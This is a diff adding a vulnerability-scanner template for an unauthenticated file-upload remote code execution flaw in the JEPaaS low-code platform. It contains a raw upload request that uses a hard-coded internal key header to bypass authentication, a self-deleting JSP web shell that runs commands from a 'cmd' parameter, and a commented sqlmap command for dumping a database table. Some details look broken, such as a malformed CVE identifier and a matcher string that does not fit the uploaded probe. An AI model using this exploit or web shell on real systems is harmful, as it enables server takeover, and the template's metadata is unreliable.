@@ -1,0 +1,58 @@
+id: 2024-105291424
+
+info:
+  name: JEPaaS 低代码平台 document-file 文件上传致RCE漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    JEPaaS 低代码平台 document/file 接口处存在文件上传漏洞，未经身份验证的远程攻击者可利用内部默认的key参数绕过权限认证上传任意文件，在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139292374
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105291424
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-29
+    version: JEPaaS
+    fofa-query: icon_hash="-999810473"
+  tags: fileupload,rce
+
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  pay1: '<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
+
+# python3 sqlmap.py -r 注入数据包.txt --level 3 -D "jepaas" -T "je_document_file" --dump --fresh-queries
+http:
+  - raw:
+      - |-
+        POST /je/document/file?bucket=webroot HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
+        internalRequestKey: schedule_898901212
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+        Connection: close
+        
+        ------21909179191068471382830692394
+        Content-Disposition: form-data; name="files"; filename="test.jsp"
+        Content-Type: image/jpeg
+        
+        <%out.println(11*11);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------21909179191068471382830692394--
+
+      # - |
+      #   GET {{url}}/{{file_name}} HTTP/1.1
+      #   Host: {{Hostname}}
+  
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "1000")'
+        condition: and
